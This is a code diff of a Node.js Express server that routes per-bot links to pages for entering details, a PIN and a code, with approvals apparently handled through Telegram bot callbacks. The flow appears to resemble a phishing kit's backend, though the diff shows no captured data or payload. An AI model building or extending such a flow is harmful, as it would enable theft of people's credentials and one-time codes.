@@ -15,7 +15,6 @@ const approvedCodes = {};     // requestId -> true/false/null
 const requestBotMap = {};     // requestId -> botId
 
 // ---------------- MULTI-BOT STORE ----------------
-// Load bots from JSON file if exists, otherwise initialize with default
 let bots = [];
 if (fs.existsSync(BOTS_FILE)) {
     try {
@@ -26,18 +25,9 @@ if (fs.existsSync(BOTS_FILE)) {
         bots = [];
     }
 } else {
-    // Initial bots from .env
     bots = [
-        {
-            botId: 'bot1',
-            botToken: process.env.BOT1_TOKEN,
-            chatId: process.env.BOT1_CHATID
-        },
-        {
-            botId: 'bot2',
-            botToken: process.env.BOT2_TOKEN,
-            chatId: process.env.BOT2_CHATID
-        }
+        { botId: 'bot1', botToken: process.env.BOT1_TOKEN, chatId: process.env.BOT1_CHATID },
+        { botId: 'bot2', botToken: process.env.BOT2_TOKEN, chatId: process.env.BOT2_CHATID }
     ];
     fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
     console.log('✅ Default bots saved to bots.json');
@@ -86,25 +76,22 @@ async function answerCallback(bot, callbackId) {
     }
 }
 
-// ---------------- ROOT REDIRECT ----------------
-app.get('/', (req, res) => {
-    // Redirect root domain to default bot
-    res.redirect('/bot/bot1');
-});
-
 // ---------------- DYNAMIC PAGE SERVING ----------------
+
+// --- FIXED: Inject botId into index.html ---
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
-    console.log(`🔎 Accessing botId: ${req.params.botId}`);
     if (!bot) return res.status(404).send('Invalid bot link');
 
-    // Send index.html with botId as query param so frontend can read it
-    res.sendFile(path.join(__dirname, 'public', 'index.html'), {
-        headers: { 'Cache-Control': 'no-cache' }
-    });
+    let indexHtml = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf-8');
+
+    // Inject botId into localStorage
+    const injectScript = `<script>localStorage.setItem('botId','${bot.botId}');</script>`;
+    indexHtml = indexHtml.replace('</body>', `${injectScript}\n</body>`);
+
+    res.send(indexHtml);
 });
 
-// Serve other pages (details, pin, code, success)
 app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
